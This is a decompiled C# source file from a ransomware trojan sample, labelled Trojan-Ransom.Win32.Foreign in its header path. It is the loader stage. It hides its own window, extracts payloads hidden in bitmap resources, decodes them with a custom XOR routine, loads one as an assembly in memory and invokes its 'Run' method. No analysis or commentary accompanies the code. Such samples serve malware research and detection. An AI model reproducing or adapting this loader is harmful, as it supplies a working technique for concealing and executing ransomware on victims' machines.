// Decompiled with JetBrains decompiler
// Type: frmMain
// Assembly: BetaC, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FAE9A6C4-2FF5-4AD9-9EF1-0165332DD30F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Foreign.nfqw-c98e20865bcc0a61937111b3af6eef1d386d4fe6ee47953261e865dbea2d166c.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;

public class frmMain : Form
{
  public static Assembly assembly;
  public static byte[] Asm;
  public static byte[] data;
  public static object[] invoke;
  public static string Persistance;
  public static ComponentResourceManager manager2;

  public frmMain()
  {
    this.InitializeComponent();
    frmMain.assembly = Assembly.Load(frmMain.Asm);
    frmMain.Initiate("Run", new object[4]
    {
      (object) 0,
      (object) "",
      (object) frmMain.GetResource("a"),
      (object) false
    });
  }

  public static void tick_Tick(object sender, EventArgs e)
  {
  }

  public static void tick2_Tick(object sender, EventArgs e)
  {
  }

  private static byte[] GetResource(string ResName) => frmMain.DXOR(Options.GetStuff((Bitmap) frmMain.manager2.GetObject(ResName)), new byte[1], 10);

  private void InitializeComponent()
  {
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (frmMain));
    frmMain.manager2 = new ComponentResourceManager(typeof (frmMain));
    frmMain.Asm = frmMain.DXOR(Options.GetStuff((Bitmap) componentResourceManager.GetObject("b")), new byte[1], 10);
    this.SuspendLayout();
    this.FormBorderStyle = FormBorderStyle.None;
    this.ShowInTaskbar = false;
    this.ResumeLayout(false);
    this.Visible = false;
    this.WindowState = FormWindowState.Minimized;
  }

  public static object Initiate(string n, object[] t)
  {
    frmMain.invoke = t;
    return frmMain.AquireData(n);
  }

  public static byte[] DXOR(byte[] input, byte[] key, int amount)
  {
    for (int index = 0; index < input.Length; ++index)
      input[index] ^= (byte) ((int) key[index % key.Length] >> index + amount + key.Length & (int) byte.MaxValue);
    return input;
  }

  public static object AquireData(string name)
  {
    foreach (MethodInfo method in frmMain.assembly.GetType("It").GetMethods())
    {
      if (method.Name == name)
        return method.Invoke((object) null, frmMain.invoke);
    }
    return (object) null;
  }
}
